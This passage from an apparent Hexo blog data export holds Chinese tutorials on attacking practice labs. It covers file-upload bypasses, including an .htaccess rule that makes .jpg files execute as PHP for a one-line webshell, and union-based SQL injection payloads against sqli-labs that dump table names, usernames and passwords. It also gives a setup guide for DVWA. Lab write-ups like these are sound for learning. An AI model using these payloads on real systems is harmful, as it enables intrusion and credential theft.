&quot;|&quot;);</span><br><span class=\"line\">            &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class=\"line\">            if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class=\"line\">                var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class=\"line\">                alert(errMsg);</span><br><span class=\"line\">                return false;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n<p>上面的代码会对我们上传的文件进行过滤，如果满足要求的格式，就允许我们上传，否则不行。<br><img src=\"https://img-blog.csdnimg.cn/20200710190107952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>我们的绕过方法就是把这段JS代码删除。通过firebug查看元素并删除调用checkFile() 的那句话就行了</p>\n<p>绕过后就可以上传成功，查看图像得到上传路径。然后可以用菜刀连接。</p>\n<p>我们也可以用BurpSuite抓包，改包进行绕过。</p>\n<p><strong>0×03  MIME限制</strong></p>\n<p>MIME限制就是文件类型限制。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;)) &#123;</span><br><span class=\"line\">            $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br></pre></td></tr></table></figure>\n<p>从上面的代码可以看到我们的Content-Type需要满足上面三种之一才可以上传。<br>常见的：超文本标记语言文本 .html,html text/htm<br>              普通文本   .txt text/plain<br>              RTF文本. rtf application/rtf<br>             GIF图形 .gif image/gif<br>             JPEG图形 . jpg image/jpeg<br>             PHP文件  .php  application/octet-stream<br><img src=\"https://img-blog.csdnimg.cn/20200710195335306.png\" alt=\"在这里插入图片描述\"><br>类型不对，无法上传。</p>\n<p>当我们上传PHP文件时，因为类型不符合以上三种之一，就不能上传。</p>\n<p>因此，我们需要通过抓包改包改变MIME 内容。</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200710200640718.png\" alt=\"在这里插入图片描述\"><br>将Content-Type的内容改为  image/jpeg   就可以绕过MIME限制。<br><img src=\"https://img-blog.csdnimg.cn/20200710200816632.png\" alt=\"在这里插入图片描述\"></p>\n<p><strong>0×04 黑名单限制</strong></p>\n<p>文件类型根据黑名单来检测的原理就是：服务器程序根据一份文件后缀名的名单来判断是否允许当前文件上传到服务器，只要上传的文件的类型能够和这个黑名单里面的类型匹配，那么就禁止该文件上传。<br><img src=\"https://img-blog.csdnimg.cn/20200711130510847.png\" alt=\"在这里插入图片描述\"><br>上面就是黑名单里限制的格式。</p>\n<p>我们可以将文件后缀改为  phtml ,php3 ,php5。也可以运用后缀的大小写进行绕过。<br>也可以用后缀加点，加空格，点 +空格+点 绕过等等。</p>\n<p><em>今天用重写文件解析绕过。(  .htaccess文件)</em></p>\n<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>\n<p>htaccess文件内容为：<code>SetHandler application/x-httpd-php</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;FilesMatch &quot;jpg&quot;&gt;</span><br><span class=\"line\">SetHandler application&#x2F;x-httpd-php</span><br><span class=\"line\">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>\n<p>即我们上传任何格式的文件都会被当作php文件执行。</p>\n<p>先上传这样一个后缀为htaccess的文件，在上传一个.jpg的一句话，这样即使上传的一句话后缀为jpg依然可以连接一句话。</p>\n"},{"title":"sql注入练习","date":"2020-03-03T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(7).jpg.webp"],"_content":"\n\n\n最近学习sql注入里最简单的一种——**联合查询注入**。\n现在写下来理清思路，也分享分享自己的收获。\n\n联合查询的前提条件：**页面上有显示位**。\n\n什么是显示位？\n在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位。\n联合查询的过程：\n1、判断注入点\n2、判断列数\n3、获取所有数据库名\n4、获取数据库所有表名\n5、获取字段名\n6、获取字段中的数据\n\n首先，SQL注入变量的后边添加输入id=1或id=2，回显页面不同。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302112044109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n一，判断闭合符号。\n常见的有:\" , ' ,')  ,\")  ,或者没有闭合符合（最危险）\n首先在url框里输入id=1\",回显正常。这就说明这不是闭合符号，我们再换一个。\n输入id=1',出现了报错，这就说明  '  是闭合符号。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302113224263.png)\n  二，判断列数\n  在order by 后面1 ，2 ，3，......直到报错。\n\n\n> http://localhost/sqli-labs-master/Less-1/?id=1' order by 4--+\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302114058717.png)\n这就知道了总共有3列。\n\n> http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,2,3--+\n\n\n我们将id=0(数据库中不存在的数)，这样会回显我们输入的数。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302115651793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n2,3的位置就是我们输入的。\n三，获取所有数据库名。\n\n> http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,database(),3--+\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302120529852.png)\n这样数据库就出来了。\n四，获取数据库里所有表名。\n下面所需的名称及解释就直接用学长的了。\n\n> 在此之前，我们要知道在MySQL中有information_schema这个库，该库存放了所有数据库的信息。\ninformation_schema.columns包含所有表的字段\ntable_schema 数据库名\ntable_name 表名\ncolumn_name 列名\ninformation_schema.tables包含所有库的表名\ntable_schema 数据库名\ntable_name 表名\ninformation_schema.schemata包含所有数据库的名\nschema_name 数据库名\ngroup_concat()函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。\n————————————————\n版权声明：本文为CSDN博主「~Lemon」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。\n原文链接：https://blog.csdn.net/qq_43431158/article/details/90743320\n\n下面直接获取数据表名。\n\n```cpp\nhttp://localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302123834782.png)\n\n五，获取字段名。\n\n```cpp\nhttp://localhost/sqli-labs-master/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302124813636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n六，获取字段中的数值。\n\n```cpp\nhttp://localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+\n```\n注意：0x3a是区分用户名和密码的。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302125431134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n用户名和密码都知道了，剩下的自己想吧。\n","source":"_posts/用sql libs 练习sql注入（—）.md","raw":"---\ntitle: sql注入练习\ndate: 2020-03-03 15:04:05\ntags: SQL注入\ncategories: 技术\nphotos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(7).jpg.webp\n---\n\n\n\n最近学习sql注入里最简单的一种——**联合查询注入**。\n现在写下来理清思路，也分享分享自己的收获。\n\n联合查询的前提条件：**页面上有显示位**。\n\n什么是显示位？\n在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位。\n联合查询的过程：\n1、判断注入点\n2、判断列数\n3、获取所有数据库名\n4、获取数据库所有表名\n5、获取字段名\n6、获取字段中的数据\n\n首先，SQL注入变量的后边添加输入id=1或id=2，回显页面不同。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302112044109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n一，判断闭合符号。\n常见的有:\" , ' ,')  ,\")  ,或者没有闭合符合（最危险）\n首先在url框里输入id=1\",回显正常。这就说明这不是闭合符号，我们再换一个。\n输入id=1',出现了报错，这就说明  '  是闭合符号。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302113224263.png)\n  二，判断列数\n  在order by 后面1 ，2 ，3，......直到报错。\n\n\n> http://localhost/sqli-labs-master/Less-1/?id=1' order by 4--+\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302114058717.png)\n这就知道了总共有3列。\n\n> http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,2,3--+\n\n\n我们将id=0(数据库中不存在的数)，这样会回显我们输入的数。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302115651793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n2,3的位置就是我们输入的。\n三，获取所有数据库名。\n\n> http://localhost/sqli-labs-master/Less-1/?id=0' union select 1,database(),3--+\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302120529852.png)\n这样数据库就出来了。\n四，获取数据库里所有表名。\n下面所需的名称及解释就直接用学长的了。\n\n> 在此之前，我们要知道在MySQL中有information_schema这个库，该库存放了所有数据库的信息。\ninformation_schema.columns包含所有表的字段\ntable_schema 数据库名\ntable_name 表名\ncolumn_name 列名\ninformation_schema.tables包含所有库的表名\ntable_schema 数据库名\ntable_name 表名\ninformation_schema.schemata包含所有数据库的名\nschema_name 数据库名\ngroup_concat()函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。\n————————————————\n版权声明：本文为CSDN博主「~Lemon」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。\n原文链接：https://blog.csdn.net/qq_43431158/article/details/90743320\n\n下面直接获取数据表名。\n\n```cpp\nhttp://localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302123834782.png)\n\n五，获取字段名。\n\n```cpp\nhttp://localhost/sqli-labs-master/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302124813636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n六，获取字段中的数值。\n\n```cpp\nhttp://localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+\n```\n注意：0x3a是区分用户名和密码的。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200302125431134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n用户名和密码都知道了，剩下的自己想吧。\n","slug":"用sql libs 练习sql注入（—）","published":1,"updated":"2020-05-20T15:40:19.709Z","comments":1,"layout":"post","link":"","_id":"ckchhpshg001i9kq6d4zwfxuu","content":"<p>最近学习sql注入里最简单的一种——<strong>联合查询注入</strong>。<br>现在写下来理清思路，也分享分享自己的收获。</p>\n<p>联合查询的前提条件：<strong>页面上有显示位</strong>。</p>\n<p>什么是显示位？<br>在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位。<br>联合查询的过程：<br>1、判断注入点<br>2、判断列数<br>3、获取所有数据库名<br>4、获取数据库所有表名<br>5、获取字段名<br>6、获取字段中的数据</p>\n<p>首先，SQL注入变量的后边添加输入id=1或id=2，回显页面不同。<br><img src=\"https://img-blog.csdnimg.cn/20200302112044109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>一，判断闭合符号。<br>常见的有:” , ‘ ,’)  ,”)  ,或者没有闭合符合（最危险）<br>首先在url框里输入id=1”,回显正常。这就说明这不是闭合符号，我们再换一个。<br>输入id=1’,出现了报错，这就说明  ‘  是闭合符号。<img src=\"https://img-blog.csdnimg.cn/20200302113224263.png\" alt=\"在这里插入图片描述\"><br>  二，判断列数<br>  在order by 后面1 ，2 ，3，……直到报错。</p>\n<blockquote>\n<p><a href=\"http://localhost/sqli-labs-master/Less-1/?id=1&#39;\" target=\"_blank\" rel=\"noopener\">http://localhost/sqli-labs-master/Less-1/?id=1&#39;</a> order by 4–+</p>\n</blockquote>\n<p><img src=\"https://img-blog.csdnimg.cn/20200302114058717.png\" alt=\"在这里插入图片描述\"><br>这就知道了总共有3列。</p>\n<blockquote>\n<p><a href=\"http://localhost/sqli-labs-master/Less-1/?id=0&#39;\" target=\"_blank\" rel=\"noopener\">http://localhost/sqli-labs-master/Less-1/?id=0&#39;</a> union select 1,2,3–+</p>\n</blockquote>\n<p>我们将id=0(数据库中不存在的数)，这样会回显我们输入的数。<img src=\"https://img-blog.csdnimg.cn/20200302115651793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>2,3的位置就是我们输入的。<br>三，获取所有数据库名。</p>\n<blockquote>\n<p><a href=\"http://localhost/sqli-labs-master/Less-1/?id=0&#39;\" target=\"_blank\" rel=\"noopener\">http://localhost/sqli-labs-master/Less-1/?id=0&#39;</a> union select 1,database(),3–+</p>\n</blockquote>\n<p><img src=\"https://img-blog.csdnimg.cn/20200302120529852.png\" alt=\"在这里插入图片描述\"><br>这样数据库就出来了。<br>四，获取数据库里所有表名。<br>下面所需的名称及解释就直接用学长的了。</p>\n<blockquote>\n<p>在此之前，我们要知道在MySQL中有information_schema这个库，该库存放了所有数据库的信息。<br>information_schema.columns包含所有表的字段<br>table_schema 数据库名<br>table_name 表名<br>column_name 列名<br>information_schema.tables包含所有库的表名<br>table_schema 数据库名<br>table_name 表名<br>information_schema.schemata包含所有数据库的名<br>schema_name 数据库名<br>group_concat()函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。<br>————————————————<br>版权声明：本文为CSDN博主「~Lemon」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href=\"https://blog.csdn.net/qq_43431158/article/details/90743320\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_43431158/article/details/90743320</a></p>\n</blockquote>\n<p>下面直接获取数据表名。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200302123834782.png\" alt=\"在这里插入图片描述\"></p>\n<p>五，获取字段名。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/sqli-labs-master/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200302124813636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>六，获取字段中的数值。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+</span></span><br></pre></td></tr></table></figure>\n<p>注意：0x3a是区分用户名和密码的。<br><img src=\"https://img-blog.csdnimg.cn/20200302125431134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>用户名和密码都知道了，剩下的自己想吧。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>最近学习sql注入里最简单的一种——<strong>联合查询注入</strong>。<br>现在写下来理清思路，也分享分享自己的收获。</p>\n<p>联合查询的前提条件：<strong>页面上有显示位</strong>。</p>\n<p>什么是显示位？<br>在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位。<br>联合查询的过程：<br>1、判断注入点<br>2、判断列数<br>3、获取所有数据库名<br>4、获取数据库所有表名<br>5、获取字段名<br>6、获取字段中的数据</p>\n<p>首先，SQL注入变量的后边添加输入id=1或id=2，回显页面不同。<br><img src=\"https://img-blog.csdnimg.cn/20200302112044109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>一，判断闭合符号。<br>常见的有:” , ‘ ,’)  ,”)  ,或者没有闭合符合（最危险）<br>首先在url框里输入id=1”,回显正常。这就说明这不是闭合符号，我们再换一个。<br>输入id=1’,出现了报错，这就说明  ‘  是闭合符号。<img src=\"https://img-blog.csdnimg.cn/20200302113224263.png\" alt=\"在这里插入图片描述\"><br>  二，判断列数<br>  在order by 后面1 ，2 ，3，……直到报错。</p>\n<blockquote>\n<p><a href=\"http://localhost/sqli-labs-master/Less-1/?id=1&#39;\" target=\"_blank\" rel=\"noopener\">http://localhost/sqli-labs-master/Less-1/?id=1&#39;</a> order by 4–+</p>\n</blockquote>\n<p><img src=\"https://img-blog.csdnimg.cn/20200302114058717.png\" alt=\"在这里插入图片描述\"><br>这就知道了总共有3列。</p>\n<blockquote>\n<p><a href=\"http://localhost/sqli-labs-master/Less-1/?id=0&#39;\" target=\"_blank\" rel=\"noopener\">http://localhost/sqli-labs-master/Less-1/?id=0&#39;</a> union select 1,2,3–+</p>\n</blockquote>\n<p>我们将id=0(数据库中不存在的数)，这样会回显我们输入的数。<img src=\"https://img-blog.csdnimg.cn/20200302115651793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>2,3的位置就是我们输入的。<br>三，获取所有数据库名。</p>\n<blockquote>\n<p><a href=\"http://localhost/sqli-labs-master/Less-1/?id=0&#39;\" target=\"_blank\" rel=\"noopener\">http://localhost/sqli-labs-master/Less-1/?id=0&#39;</a> union select 1,database(),3–+</p>\n</blockquote>\n<p><img src=\"https://img-blog.csdnimg.cn/20200302120529852.png\" alt=\"在这里插入图片描述\"><br>这样数据库就出来了。<br>四，获取数据库里所有表名。<br>下面所需的名称及解释就直接用学长的了。</p>\n<blockquote>\n<p>在此之前，我们要知道在MySQL中有information_schema这个库，该库存放了所有数据库的信息。<br>information_schema.columns包含所有表的字段<br>table_schema 数据库名<br>table_name 表名<br>column_name 列名<br>information_schema.tables包含所有库的表名<br>table_schema 数据库名<br>table_name 表名<br>information_schema.schemata包含所有数据库的名<br>schema_name 数据库名<br>group_concat()函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。<br>————————————————<br>版权声明：本文为CSDN博主「~Lemon」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href=\"https://blog.csdn.net/qq_43431158/article/details/90743320\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_43431158/article/details/90743320</a></p>\n</blockquote>\n<p>下面直接获取数据表名。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200302123834782.png\" alt=\"在这里插入图片描述\"></p>\n<p>五，获取字段名。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/sqli-labs-master/Less-1/?id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200302124813636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>六，获取字段中的数值。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/sqli-labs-master/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+</span></span><br></pre></td></tr></table></figure>\n<p>注意：0x3a是区分用户名和密码的。<br><img src=\"https://img-blog.csdnimg.cn/20200302125431134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>用户名和密码都知道了，剩下的自己想吧。</p>\n"},{"title":"搭建DVWA web渗透靶场","date":"2020-04-08T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(3).jpg.webp"],"_content":"\n\n\n﻿## 靶场的搭建是基于phpstudy环境下，phpstudy+DVWA。\n\n### 1、进入 DVWA 的官网\n官网 http://www.dvwa.co.uk/ 页面拉到最下面有下载按钮，也可以从GitHub上clone下来。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408113245560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 2、DVWA的安装与配置\n1、将DVWA解压到phpstudy目录下的www目录下。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408114405700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n2、修改配置文件\n先将 //www/DVWA-master/configure/ 中的 configure.inc.php.disc 去掉 .disc 后缀或拷贝一份去掉后缀\n然后将 configure/configure.inc.php 文件中的数据库信息修改为如下图（也就是配置数据库密码）：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020040811532423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n\n\n**用户名，密码是你数据库的。**\n\n### 3、然后浏览器访问 http://127.0.01/DWWA/setup.php\n正常页面：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408120125627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n这样直接创建就行了。\n### 4、创建成功\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408120814519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 5、登录靶场\n五选一.......\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408145600310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 6、进入主页面\n下面就是靶场漏洞目录，还有很多功能，我就不一一介绍了。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408145729704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n开始学习吧！！！\n### 7、报错总结\n成功总不是一帆风顺的，踩坑。\n1、如果出现 reCAPTCHA:Missing 字样：\n需要在 configure/configure.inc.php中配置两个量\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408120450316.png)\n\n```\n配置$_DVWA[ 'recaptcha_public_key' ] = '6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg';\n配置$_DVWA[ 'recaptcha_private_key' ] = '6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ';\n```\n\n然后刷新页面即可。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408120518902.png)\n2、数据库连接失败，会出现无法连接提示\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020040812060150.png)\n这就是前面为什么使用数据库账号和密码的原因，这样才能连接成功。\n\n\n\n","source":"_posts/搭建DVWA web渗透靶场.md","raw":"---\ntitle: 搭建DVWA web渗透靶场\ndate: 2020-04-08 15:04:05\ntags: 靶场\ncategories: 技术\nphotos: https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(3).jpg.webp\n---\n\n\n\n﻿## 靶场的搭建是基于phpstudy环境下，phpstudy+DVWA。\n\n### 1、进入 DVWA 的官网\n官网 http://www.dvwa.co.uk/ 页面拉到最下面有下载按钮，也可以从GitHub上clone下来。![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408113245560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n### 2、DVWA的安装与配置\n1、将DVWA解压到phpstudy目录下的www目录下。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200408114405700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n2、修改配置文件\n先将 //www/DVWA-master/configure/ 中的 configure.inc.php.disc 去掉 .disc 后缀或拷贝一份去掉后缀\n然后将 configure/configure.inc.php 文件中的数据库信息修改为如下图（也就是配置数据库密码）：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020040811532423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70)\n\n\n**用户名，密码是你数据库的。**\n\n### 3、然后浏览器访问 